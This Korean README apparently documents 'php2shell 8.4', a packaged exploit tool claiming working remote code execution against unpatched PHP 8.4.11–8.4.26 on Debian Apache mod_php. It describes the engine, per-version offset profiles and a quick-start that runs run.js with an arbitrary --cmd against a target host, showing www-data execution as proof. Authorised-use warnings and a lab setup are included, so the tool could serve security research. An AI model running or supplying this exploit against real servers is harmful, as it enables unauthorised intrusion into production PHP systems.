# php2shell 8.4 — Debian Apache (mod_php)

**PHP 8.4 패치 이전** 버전을 대상으로 한 16개의 동작하는 exploit입니다.
대상 환경은 **Debian + Apache mod_php** (`apache2handler`)이며
`php.ini-production` 프로필을 사용합니다.

> **승인된 환경에서만 사용하십시오.** 자체 실험실 또는 서면 승인을 받은
> 대상에만 실행하십시오. 성공 기준은 대상에 생성된 proof 파일입니다.
> proof가 없으면 **RCE가 아닙니다**.

언어: [pt-BR](../../README.md) · [English](README.en.md) · [中文](README.zh.md) ·
[فارسی](README.fa.md) · [العربية](README.ar.md) · [Русский](README.ru.md) ·
[한국어](README.ko.md)




최초 취약점 공지에서 출발해 독립적으로 연구했고, 실험실에서 PoC를 만든 뒤 프로덕션 컨테이너 도달에 집중했습니다.

## 지원 버전 (16)

| 범위 | 버전 | 3단계 `s_off` |
|:--|:--|:--|
| 8.4.11–8.4.26 | 16개 버전 | `0xF8398` |

## 저장소 내용

```text
engine/pure_fixed.js     A1→B1→A2→B2 엔진
profiles/*.json          16개 프로필: 심볼, s_off, 요구사항
run.js                   프로필 선택 후 엔진 실행
target/                  php.ini-production + Apache prefork 150 + index.php
tests/*.test.js   16개 프로필 검증
```

스캔하지 않고 한 번에 **하나의 버전**만 proof 파일과 함께 실행합니다.

## 요구사항

- 운영 호스트의 Node.js 20+.
- 대상/실험실의 Docker.
- 공식 `php:<version>-apache` (Debian) 이미지와 `target/php.ini`,
  `target/apache.conf` 마운트.
- proof를 위한 공유 볼륨 (대상의 `/out`).

## 빠른 시작 (로컬 실험실)

```bash
mkdir -p out
docker run -d --name p2s-8426 -p 19300:80 \
  -v "$PWD/target/php.ini:/usr/local/etc/php/php.ini:ro" \
  -v "$PWD/target/apache.conf:/etc/apache2/conf-enabled/zz-prod.conf:ro" \
  -v "$PWD/target/www:/var/www/html:ro" \
  -v "$PWD/out:/out" \
  php:8.4.26-apache

./run.js --version 8.4.26 --host 127.0.0.1 --port 19300 \
  --proof out/p1 --cmd 'id>/out/p1' --retries 4 --probes 6

cat out/p1
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

다른 버전을 사용하려면 `8.4.26`과 이미지 태그를 변경하십시오.

## 결과 해석

| 출력 | 의미 |
|:--|:--|
| `out/p1`에 `uid=...` 포함 | 실행이 증명됨 |
| 엔진이 proof를 말하지만 파일이 비어 있음 | **RCE 아님**; 실패 |
| `leak failed` / `no proof` | 실행되지 않음; 대상을 재시작 후 재시도 |

각 시도는 깨끗한 worker에서 시작해야 합니다. `run.js`는 컨테이너를
자동으로 재시작하지 않습니다.

## 솔직한 한계

- 권한은 `www-data`이며 root가 아닙니다.
- 결과는 이미지의 정확한 빌드에 의존합니다. 반복 시 tag/digest를 고정하십시오.

## 테스트

```bash
node --test
```

## 문서

- `docs/como-reproduzir.md` — 단계별 재현 및 문제 해결 (pt-BR).

## 경고

이 자료는 승인된 보안 연구용입니다. 허가 없이 제3자 시스템에 사용하지
마십시오. 사용 책임은 운영자에게 있습니다.